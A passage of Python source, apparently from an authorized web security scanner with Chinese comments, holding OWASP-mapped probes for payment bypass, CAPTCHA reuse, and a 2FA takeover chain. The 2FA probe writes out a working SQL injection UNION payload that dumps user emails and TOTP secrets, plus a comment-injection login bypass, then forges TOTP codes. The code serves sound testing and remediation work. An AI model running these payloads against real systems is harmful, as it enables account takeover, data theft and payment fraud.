            reproduction=("注册测试账号 → 登录 → 提交账户擦除请求 → "
                          "使用原凭据再次登录，依然获得会话。"),
            remediation=("擦除流程必须真正失效化：禁用账户、作废会话与令牌、"
                        "按保留策略删除或匿名化个人数据，并向用户确认完成。"),
            compliance="GDPR Art.17 / PIPL 第47条 / OWASP ASVS 5.4",
            evidence=[finding_evidence("response",
                                       "擦除请求 2xx 后，原凭据登录仍返回 200 与令牌",
                                       "一次性账号复登录实验")],
            grading_basis="注册-擦除-复登录全链实测，证据级 A")],
        note=(f"一次性账号 {email} 提交擦除请求后，原凭据仍可正常登录 —— "
              "擦除流程未使账户失效。"),
        lead=["请清理实验账号（如目标支持管理端删除）并留痕"])


# ----------------------------------------------------------------------
# 探针 6：免费会员 / 支付绕过（Deluxe Fraud；BUSL-10 映射）
# ----------------------------------------------------------------------
_SUCCESS_RE = re.compile(r"success|congrat|upgrade|activated|已开通|成功|deluxe", re.I)


def probe_free_membership(ctx) -> ReconOutcome:
    why = _gate(ctx)
    if why:
        return _manual_only(why, "会员开通绕过验证需要登录态并提交空支付参数；"
                                 "未授权时不执行。")
    token, _ = _register_login(ctx)
    if not token:
        return _manual_only(
            "未能注册 / 登录一次性账号 —— 会员开通类验证必须在登录态下做，"
            "本项不执行（靶场需允许公开注册）")
    auth_hdrs = {"Authorization": f"Bearer {token}"}
    eps = _endpoints(ctx, r"(deluxe|membership|subscription|premium|vip|会员|订阅|升级)",
                     ["/rest/deluxe-membership", "/api/membership",
                      "/api/subscribe", "/api/premium"])
    if not eps:
        return ReconOutcome(ran=True, probes=0,
                            note="未定位到会员 / 订阅开通端点，该项维持待人工。")
    probes = 0
    for url in eps[:3]:
        probes += 1
        r = _req(ctx, "POST", url, json_body={}, headers=auth_hdrs,
                 kind="会员开通绕过探针")
        body = r.text or ""
        if r.status_code in (200, 201) and _SUCCESS_RE.search(body):
            from engine.registry import make_finding
            from engine.checks.base import finding_evidence  # noqa: PLC0415
            return ReconOutcome(
                ran=True, probes=probes,
                findings=[make_finding(
                    "WSTG-BUSL-10", "未支付任何款项即开通付费会员（支付参数缺失未校验）",
                    ctx.target_name, endpoint=url,
                    severity="高危", confidence="High", evidence_level="A",
                    description=(f"登录态下 POST {url}，请求体不含任何支付方式 / "
                                 "支付凭证字段，服务端直接返回开通成功 —— "
                                 "付费会员的支付环节可被整体跳过。"),
                    technical_detail=(f"POST {url}，body：{{}}（空），"
                                      f"响应 HTTP {r.status_code}：{body[:150]}。"),
                    impact=("付费权益可被零成本批量获取，直接资损；同类逻辑"
                            "（下单不支付、订阅免费领）通常同源存在。"),
                    reproduction=(f"curl -s -X POST '{url}' -H 'Authorization: "
                                  "Bearer <token>' -H 'Content-Type: "
                                  "application/json' -d '{}'"),
                    remediation=("服务端独立判定支付结果再开通权益；"
                                "缺失 / 未验证的支付参数一律拒绝，不进入开通分支。"),
                    compliance="OWASP ASVS 5.4 / CWE-840 / 等保2.0 入侵防范",
                    evidence=[finding_evidence("response", body[:200],
                                               f"POST {url}（空 body 开通成功）")],
                    grading_basis="登录态空 body 实测开通成功，证据级 A")],
                note=(f"POST {url}（空 body，无任何支付字段）→ HTTP "
                      f"{r.status_code} 开通成功。"),
                lead=["如为测试账号请将会员等级回滚，避免影响后续用例"])
    return ReconOutcome(
        ran=True, probes=probes,
        note=("已对会员 / 订阅端点做空支付参数验证：均未开通成功 —— "
              "未确证支付绕过，该项维持待人工（人工需继续测试支付金额 / "
              "支付状态字段的篡改）。"))


# ----------------------------------------------------------------------
# 探针 7：验证码与防自动化（CAPTCHA Bypass；BUSL-07 映射）
# ----------------------------------------------------------------------
def probe_captcha_automation(ctx) -> ReconOutcome:
    why = _gate(ctx)
    if why:
        return _manual_only(why, "防自动化验证会连续提交多条反馈；"
                                 "未授权时不执行。")
    cap_eps = _endpoints(ctx, r"(captcha|验证码)",
                         ["/rest/captcha", "/api/captcha", "/captcha"])
    probes = 0
    answer_leak = False
    for url in cap_eps[:2]:
        probes += 1
        r = _req(ctx, "GET", url, kind="验证码接口探测")
        if r.status_code != 200:
            continue
        try:
            d = json.loads(r.text or "")
        except Exception:  # noqa: BLE001
            continue
        if not isinstance(d, dict):
            continue
        for k, v in d.items():
            kl = k.lower()
            if v and ("answer" in kl or "solution" in kl or "code" in kl):
                answer_leak = True
        if answer_leak:
            break
    fb_eps = _endpoints(ctx, r"(feedback|review|comment|contact|反馈|评论|留言)",
                        ["/api/Feedbacks"])
    if not fb_eps:
        return ReconOutcome(
            ran=True, probes=probes,
            note=("验证码答案泄露：" + ("是" if answer_leak else "否")
                  + "；未定位到反馈 / 留言提交端点，防自动化连发验证未执行。"))
    token, _ = _register_login(ctx)
    auth_hdrs = {"Authorization": f"Bearer {token}"} if token else {}
    ok = 0
    statuses: list[int] = []
    t0 = time.time()
    for i in range(10):
        cap_hdrs: dict = {}
        payload: dict = {"comment": f"aiscan captcha probe {i}",
                         "message": f"aiscan captcha probe {i}",
                         "rating": 3}
        if answer_leak:
            probes += 1
            rc = _req(ctx, "GET", cap_eps[0], kind="取验证码")
            try:
                d = json.loads(rc.text or "")
                # API 要的是 captcha 字段=答案值（response 的 answer 字段），
                # 不是把 response 的 captcha 字段（数学式子）原样回填。
                payload["captchaId"] = d.get("captchaId")
                payload["captcha"] = d.get("answer")
            except Exception:  # noqa: BLE001
                pass
        probes += 1
        r = _req(ctx, "POST", fb_eps[0], json_body=payload,
                 headers=auth_hdrs, kind="反馈连发验证")
        statuses.append(r.status_code)
        if r.status_code in (200, 201, 204):
            ok += 1
    elapsed = time.time() - t0
    if ok >= 10 and elapsed <= 25:
        from engine.registry import make_finding
        from engine.checks.base import finding_evidence  # noqa: PLC0415
        detail = ("验证码接口随响应直接下发答案，且验证码不绑定会话、可重复使用；"
                  if answer_leak else
                  "反馈端点未部署有效防自动化措施；")
        return ReconOutcome(
            ran=True, probes=probes,
            findings=[make_finding(
                "WSTG-BUSL-07", "防自动化措施可被绕过（20 秒内连续提交 10 条反馈）",
                ctx.target_name, endpoint=fb_eps[0],
                severity="中危", confidence="High", evidence_level="A",
                description=(f"{detail}实测 {elapsed:.1f} 秒内连续提交 10 条反馈，"
                             f"全部被接受（HTTP {statuses[0]} 等）—— "
                             "验证码 / 频率限制未形成有效防自动化。"),
                technical_detail=(f"POST {fb_eps[0]} ×10，状态码序列 "
                                  f"{statuses}，总耗时 {elapsed:.1f}s。"
                                  + (f"GET {cap_eps[0]} 响应中直接包含答案字段。"
                                     if answer_leak else "")),
                impact=("可用于批量刷反馈 / 刷单 / 撞库式滥用；验证码形同虚设时，"
                        "依赖它的风控（注册、登录、领券）同时失效。"),
                reproduction=(f"for i in $(seq 10); do curl -s -X POST "
                              f"'{fb_eps[0]}' -d '{{...}}'; done  # 10 次全部成功"),
                remediation=("① 验证码答案不得随接口下发；② 验证码一次性消费并"
                                    "绑定会话；③ 服务端按 IP / 账号维度限流；"
                                    "④ 关键操作叠加行为验证。"),
                compliance="OWASP ASVS 5.4 / CWE-770 / 等保2.0 入侵防范",
                evidence=[finding_evidence("response",
                                           f"10 连发状态码 {statuses}，耗时 {elapsed:.1f}s",
                                           f"POST {fb_eps[0]} ×10")],
                grading_basis="实测 20 秒内 10 次提交全部成功，证据级 A")],
            note=(f"{elapsed:.1f} 秒内 10 条反馈全部提交成功"
                  + ("（验证码答案随接口下发）" if answer_leak else "")
                  + " —— 防自动化未生效。"),
            lead=["请清理测试反馈并留痕"])
    return ReconOutcome(
        ran=True, probes=probes,
        note=(f"已做防自动化验证：10 条反馈中 {ok} 条成功（状态码 {statuses}，"
              f"耗时 {elapsed:.1f}s），验证码答案泄露："
              f"{'是' if answer_leak else '否'} —— 未达到确证条件，"
              "该项维持待人工。"))


# ----------------------------------------------------------------------
# 探针 8：2FA 密钥泄露 → 完整通过二次验证（ATHN-11 映射）
# ----------------------------------------------------------------------
def probe_2fa_secret_leak(ctx) -> ReconOutcome:
    why = _gate(ctx)
    if why:
        return _manual_only(why, "2FA 链验证依赖 SQLi 导出用户表与登录绕过；"
                                 "未授权时不执行。")
    probes = 0
    # ---- ① SQLi UNION 导出用户表 ----
    search_eps = _endpoints(ctx, r"(search|查询|搜索)",
                            ["/rest/products/search", "/api/search", "/search"])
    dump: dict | None = None
    for url in search_eps[:2]:
        for cols in (9, 8, 10, 7, 11, 12):
            selects = ["id", "email", "password", "totpSecret"] + \
                      [str(i) for i in range(cols - 4)]
            payload = "')) UNION SELECT " + ", ".join(selects) + " FROM Users-- -"
            probes += 1
            r = _req(ctx, "GET", url + "?q=" + urllib.parse.quote(payload),
                     kind="SQLi 用户表导出探测")
            if r.status_code != 200:
                continue
            try:
                rows = json.loads(r.text or "").get("data") or []
            except Exception:  # noqa: BLE001
                continue
            for row in rows:
                if not isinstance(row, dict):
                    continue
                vals = [str(v) for v in row.values() if v is not None]
                email = next((v for v in vals if _EMAIL_RE.match(v)), "")
                secret = next((v for v in vals if _B32_SECRET_RE.match(v)), "")
                if email and secret:
                    dump = {"email": email, "secret": secret}
                    break
            if dump:
                break
        if dump:
            break
    if not dump:
        return ReconOutcome(
            ran=True, probes=probes,
            note="已对搜索类端点做 SQLi UNION 用户表导出尝试，未获得可用的"
                 "「邮箱 + base32 密钥」组合 —— 2FA 链未复现，该项维持待人工。")
    email, secret = dump["email"], dump["secret"]

    # ---- ② SQLi 注释登录取二次验证临时令牌 ----
    login_eps = _endpoints(ctx, r"(login|signin|session|登录)",
                           ["/rest/user/login", "/api/login"])
    tmp = ""
    for url in login_eps[:2]:
        probes += 1
        r = _req(ctx, "POST", url,
                 json_body={"email": f"{email}'-- -", "password": "x"},
                 kind="SQLi 登录绕过探测")
        try:
            d = json.loads(r.text or "")
        except Exception:  # noqa: BLE001
            continue
        tmp = (d.get("data", {}).get("tmpToken")
               or d.get("tmpToken") or d.get("data", {}).get("token") or "")
        if tmp:
            break
    if not tmp:
        return ReconOutcome(
            ran=True, probes=probes,
            note=(f"SQLi 已导出用户表（含 {email} 的二次验证密钥字段），"
                  "但该账户未处于「口令已过、待二次验证」状态（可能未开启 2FA）—— "
                  "2FA 链未走完，该项维持待人工。"))

    # ---- ③ 用泄露密钥生成 TOTP 并完成验证 ----
    verify_eps = _endpoints(ctx, r"(2fa|mfa|verify|twofactor|totp)",
                            ["/rest/2fa/verify", "/api/2fa/verify"])
    for url in verify_eps[:2]:
        probes += 1
        r = _req(ctx, "POST", url,
                 json_body={"tmpToken": tmp, "totpToken": _totp(secret)},
                 kind="2FA 验证链探针")
        body = r.text or ""
        if r.status_code == 200 and re.search(r"token|authentication|success", body, re.I):
            from engine.registry import make_finding
            from engine.checks.base import finding_evidence  # noqa: PLC0415
            return ReconOutcome(
                ran=True, probes=probes,
                findings=[make_finding(
                    "WSTG-ATHN-11", "2FA 密钥可经注入泄露并完整通过二次验证",
                    ctx.target_name, endpoint=url,
                    severity="高危", confidence="High", evidence_level="A",
                    description=(f"经 SQL 注入导出用户表获得 {email} 的 TOTP 密钥"
                                 "（32 位 base32，报告不展示值），本地生成动态口令后"
                                 f"POST {url} 完成二次验证并取得会话令牌 —— "
                                 "第二因子完全失效。"),
                    technical_detail=("① GET 搜索端点 UNION 导出 Users 表；"
                                      f"② 定位 {email} 的 totpSecret 字段；"
                                      "③ SQLi 注释登录取得 password_valid_needs_"
                                      "second_factor_token；④ HMAC-SHA1 本地计算 "
                                      "TOTP；⑤ POST 2FA 验证端点 → 200 + token。"),
                    impact=("二次验证可被完整绕过，多因子认证对注入型攻击无效；"
                            "任何能触达注入点的攻击者都可接管已开 2FA 的账号。"),
                    reproduction=("① SQLi UNION 导出用户表取 totpSecret；"
                                  "② 注释登录取 tmpToken；③ 按 RFC6238 生成 "
                                  "TOTP；④ POST /rest/2fa/verify {tmpToken, "
                                  "totpToken}。"),
                    remediation=("① 修复注入点（参数化查询）；② TOTP 密钥不得经"
                                "任何接口 / 注入可达；③ 2FA 验证失败限流并告警；"
                                "④ 密钥加密存储。"),
                    compliance="OWASP ASVS 2.8 / CWE-287 / 等保2.0 身份鉴别",
                    evidence=[finding_evidence(
                        "response", body[:200],
                        f"POST {url}（2FA 验证通过并下发令牌）")],
                    grading_basis="注入取钥→生成 TOTP→验证通过全链实测，证据级 A")],
                note=(f"经 SQLi 泄露 {email} 的 TOTP 密钥并成功通过二次验证"
                      f"（POST {url} → 200 + 令牌）。"))
    return ReconOutcome(
        ran=True, probes=probes,
        note=(f"已导出用户表含 {email} 的二次验证密钥，但验证端点未接受"
              "生成的动态口令 —— 2FA 链未走完，该项维持待人工。"))


__all__ = [
    "probe_upload_limits", "probe_poison_null_byte", "probe_rating_range",
    "probe_coupon_expiry", "probe_erasure_ineffective", "probe_free_membership",
    "probe_captcha_automation", "probe_2fa_secret_leak",
]
